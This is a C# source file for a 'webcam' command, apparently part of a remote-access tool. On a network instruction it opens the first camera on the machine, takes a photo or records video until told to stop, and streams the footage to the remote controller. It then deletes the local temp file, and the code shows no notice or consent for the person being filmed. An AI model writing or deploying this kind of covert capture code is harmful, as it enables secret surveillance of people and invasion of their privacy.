﻿using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Timers;
using Accord.Video;
using Accord.Video.DirectShow;
using Accord.Video.FFMPEG;
using Server.Commands.Core;
using Shared;
using Timer = System.Timers.Timer;

namespace Server.Commands
{
    internal class Webcam : ICommand
    {
        public string name { get; } = "webcam";


        VideoCaptureDevice videoDevice;

        FilterInfo captureDevice;

        VideoFileWriter fileWriter = new VideoFileWriter();

        string videoFileName;

        bool mustReturn;


        
        public void Process(List<string> args)
        {
            mustReturn = false;

            try
            {
                captureDevice = new FilterInfoCollection(FilterCategory.VideoInputDevice)[0];
            }
            catch (Exception)
            {
                ServerCommandsManager.networkManager.WriteLine("NoCam");
                return;
            }

            videoDevice = new VideoCaptureDevice(captureDevice.MonikerString);

            if (args[0] == "picture")
            {
                TakePicture();
            }
            else
            {
                TakeVideo();
            }
        }


        void TakePicture()
        {
            videoDevice.NewFrame += Picture_NewFrame;
            videoDevice.Start();

            // Leave 3 seconds to get a frame
            var timer = new Timer(3000);
            timer.Elapsed += Timer_Elapsed;
            timer.AutoReset = false;
            timer.Enabled = true;

            while (!mustReturn)
            {
                Thread.Sleep(100);
            }
        }


        void TakeVideo()
        {
            videoDevice.NewFrame += Video_NewFrame;
            videoDevice.Start();
            ServerCommandsManager.networkManager.WriteLine("OK");

            // wait for user input to stop recording
            ServerCommandsManager.networkManager.ReadLine();

            // Wait for the capture device to stop, avoiding accessviolation exception if a newframe event is triggered
            videoDevice.SignalToStop();
            while (videoDevice.IsRunning)
            {
                Thread.Sleep(100);
            }
            fileWriter.Close();

            using (var fs = new FileStream(videoFileName, FileMode.Open))
            {
                ServerCommandsManager.networkManager.StreamToNetworkStream(fs);
            }

            File.Delete(videoFileName);
        }
        

        void Video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            if (!fileWriter.IsOpen)
            {
                videoFileName = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.tmp");
                fileWriter.Open(videoFileName, eventArgs.Frame.Width, eventArgs.Frame.Height, 30, VideoCodec.MPEG4, 2500000);
            }
            
            fileWriter.WriteVideoFrame(eventArgs.Frame);
        }


        void Picture_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            videoDevice.SignalToStop();
            ServerCommandsManager.networkManager.WriteLine("OK");

            using (var ms = new MemoryStream())
            {
                eventArgs.Frame.Save(ms, ImageFormat.Png);
                ServerCommandsManager.networkManager.StreamToNetworkStream(ms);
            }

            mustReturn = true;
        }


        void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            // If the video source is still running, no pic was taken
            if (videoDevice.IsRunning)
            {
                ServerCommandsManager.networkManager.WriteLine("KO");
                mustReturn = true;
            }
        }
    }
}
